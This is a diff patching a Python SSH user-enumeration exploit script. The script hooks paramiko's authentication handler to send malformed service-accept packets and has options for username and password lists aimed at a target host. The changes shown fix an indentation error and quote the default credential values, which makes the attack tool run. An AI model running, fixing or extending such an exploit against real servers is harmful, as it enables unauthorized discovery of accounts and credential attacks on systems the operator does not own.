@@ -56,7 +56,7 @@ def exploit(hostname, username, port, validuser = ""):
     paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
     # get rid of paramiko logging
-     logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
     
     # create function to perform authentication with malformed MSG_SERVICE_ACCEPT Received packet and desired username
     def checkUsername(username, tried=0):
@@ -155,9 +155,9 @@ try:
     group = arg_parser
     arg_parser.add_argument('--port', type=int, default=22, help="The target port (Default 22)")
     arg_parser.add_argument('--suppress', type=bool, default=False, help="Suppresses unsuccessful usernames or passwords")    
-    arg_parser.add_argument('--username', type=str, default=user, help="A Single Usename to Enumerate")
+    arg_parser.add_argument('--username', type=str, default="user", help="A Single Usename to Enumerate")
     arg_parser.add_argument('--userfile', type=str, help="The list of usernames (one per line) to enumerate through")   
-    arg_parser.add_argument('--password', type=str, default=password, help="A Single Password to Enumerate")
+    arg_parser.add_argument('--password', type=str, default="password", help="A Single Password to Enumerate")
     arg_parser.add_argument('--passfile', type=str, help="The list of passwords (one per line) to enumerate through")
 
     args = arg_parser.parse_args()
